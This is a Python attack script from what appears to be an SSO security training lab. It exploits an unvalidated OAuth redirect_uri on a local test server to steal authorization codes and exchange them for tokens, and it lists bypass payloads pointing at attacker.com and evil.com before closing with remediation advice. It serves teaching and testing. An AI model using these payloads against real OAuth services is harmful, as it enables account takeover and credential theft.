#!/usr/bin/env python3
"""
==============================================================
 SSO Vuln Lab — Attack: Lab 5 — Open redirect_uri Bypass
==============================================================
 Target:  http://localhost:5000/lab5/login
 Goal:    Steal victim's OAuth authorization code by
          injecting an attacker-controlled redirect_uri
 Impact:  Authorization code theft → full account takeover
 CVSSv3:  9.3 (Critical)

 Root cause:
   1. Client uses redirect_uri from query parameter (attacker input)
   2. OAuth server does not strictly validate redirect_uri
      (VULN_ALLOW_ANY_REDIRECT=true)
   Both flaws combine for a critical impact.

 Real HackerOne reports:
   HackerOne #55525   — Facebook redirect_uri bypass
   HackerOne #244713  — Google OAuth redirect_uri manipulation
   HackerOne #665651  — Microsoft OAuth open redirect
   HackerOne #1074047 — Slack redirect_uri bypass via path traversal

 Bypass techniques:
   A) Direct: redirect_uri=http://attacker.com/steal
   B) Path traversal: redirect_uri=https://legit.com/../../../evil.com/
   C) Subdomain: redirect_uri=https://evil.legit.com/
   D) URL fragment: redirect_uri=https://legit.com/page#@evil.com/
   E) Double encoding: redirect_uri=https://legit.com%2F..%2F..%2Fevil.com/
   F) Open redirect chain: redirect_uri=https://legit.com/redir?url=http://evil.com

 Attack flow:
   1. Attacker crafts /lab5/login?redirect_uri=http://localhost:5000/lab5/steal
   2. Victim clicks link → OAuth flow starts with evil redirect_uri
   3. OAuth server sends code to attacker's /steal endpoint
   4. Attacker uses stolen code at token endpoint → gets access token
   5. Attacker authenticated as victim
==============================================================
"""

import sys, requests
from urllib.parse import urlencode, urlparse, parse_qs

CLIENT_URL   = "http://localhost:5000"
OAUTH_SERVER = "http://localhost:4000"
CLIENT_ID    = "vulnerable-client"
CLIENT_SECRET= "client-secret-abc123"
ATTACKER_URL = f"{CLIENT_URL}/lab5/steal"  # using built-in steal endpoint

def demonstrate_redirect_uri_bypass():
    print("""
╔══════════════════════════════════════════════════════╗
║  LAB 5 — OAuth redirect_uri Bypass                  ║
╚══════════════════════════════════════════════════════╝
""")

    # ── Technique A: Direct redirect_uri injection ────────
    print("[Technique A] Direct redirect_uri injection:")
    evil_uri = ATTACKER_URL
    attack_url = f"{CLIENT_URL}/lab5/login?redirect_uri={evil_uri}"
    print(f"  Attack URL: {attack_url}")
    print(f"  Victim clicks → code sent to: {evil_uri}\n")

    # ── Technique B: Path traversal ──────────────────────
    print("[Technique B] Path traversal (if server does prefix match):")
    legit_base = "http://localhost:5000/lab5/callback"
    traversal  = "http://localhost:5000/lab5/callback/../steal"
    print(f"  Registered: {legit_base}")
    print(f"  Bypass:     {traversal}\n")

    # ── Technique C: Subdomain ────────────────────────────
    print("[Technique C] Subdomain (if server allows *.legitimate.com):")
    print("  Registered: http://app.legitimate.com/callback")
    print("  Bypass:     http://evil.legitimate.com.attacker.com/callback\n")

    # ── Technique D: URL fragment ─────────────────────────
    print("[Technique D] URL fragment trick:")
    print("  http://legitimate.com/callback#@attacker.com/\n")

    # ── Live Exploit ──────────────────────────────────────
    print("=" * 55)
    print("[LIVE EXPLOIT] Testing direct redirect_uri injection...")
    print("=" * 55)

    session = requests.Session()

    # Step 1: Initiate flow with evil redirect_uri
    print(f"\n[*] Step 1: Sending victim to login with evil redirect_uri")
    print(f"[*] Evil redirect_uri: {evil_uri}")

    r = session.get(
        f"{CLIENT_URL}/lab5/login",
        params={"redirect_uri": evil_uri},
        allow_redirects=False,
        timeout=5
    )

    if r.status_code in (301, 302):
        auth_url = r.headers.get("Location","")
        print(f"[✓] Client redirected to auth server: {auth_url[:100]}...")

        parsed = urlparse(auth_url)
        qs     = parse_qs(parsed.query)
        actual_redir = qs.get("redirect_uri", [""])[0]
        print(f"[*] redirect_uri in auth request: {actual_redir}")

        if actual_redir == evil_uri or "steal" in actual_redir:
            print(f"[✓] CONFIRMED: Evil redirect_uri accepted by client!")
        else:
            print(f"[?] redirect_uri is: {actual_redir}")
    else:
        print(f"[*] Response: {r.status_code}")

    # Step 2: Show what happens when victim authorizes
    print(f"""
[*] Step 2: Victim logs in → OAuth server redirects to:
    {evil_uri}?code=<STOLEN_CODE>&state=...

[*] Step 3: Attacker's steal endpoint receives the code
    Visit: {CLIENT_URL}/lab5/steal?code=EXAMPLE_CODE

[*] Step 4: Attacker exchanges stolen code for tokens:
    POST {OAUTH_SERVER}/oauth/token
      grant_type=authorization_code
      code=<STOLEN_CODE>
      redirect_uri={evil_uri}
      client_id={CLIENT_ID}
      client_secret={CLIENT_SECRET}
""")

    # Step 3: Test if steal endpoint works
    print("[*] Testing built-in steal endpoint (simulates attacker's server)...")
    r2 = requests.get(f"{CLIENT_URL}/lab5/steal?code=TEST123&state=xyz",
                      timeout=5)
    if r2.status_code == 200:
        print(f"[✓] Steal endpoint is live: {CLIENT_URL}/lab5/steal")
        print("[✓] In real attack: this endpoint exchanges the code and logs in as victim")

    print(f"""
╔══════════════════════════════════════════════════════╗
║  FULL ATTACK URL for victim to click:               ║
║                                                      ║
║  {CLIENT_URL}/lab5/login?redirect_uri={ATTACKER_URL}
║                                                      ║
║  REMEDIATION:                                       ║
║  - Hardcode redirect_uri in client (don't accept    ║
║    user input)                                      ║
║  - Server: exact-match whitelist, not prefix        ║
║  - Never use wildcard or partial URI matching       ║
╚══════════════════════════════════════════════════════╝
""")

def steal_code_manually(code):
    """Exchange a manually-captured authorization code."""
    print(f"[*] Exchanging stolen code: {code}")
    r = requests.post(f"{OAUTH_SERVER}/oauth/token", data={
        "grant_type":    "authorization_code",
        "code":          code,
        "redirect_uri":  ATTACKER_URL,
        "client_id":     CLIENT_ID,
        "client_secret": CLIENT_SECRET,
    }, timeout=5)
    print(f"[*] Token response: {r.json()}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        steal_code_manually(sys.argv[1])
    else:
        demonstrate_redirect_uri_bypass()
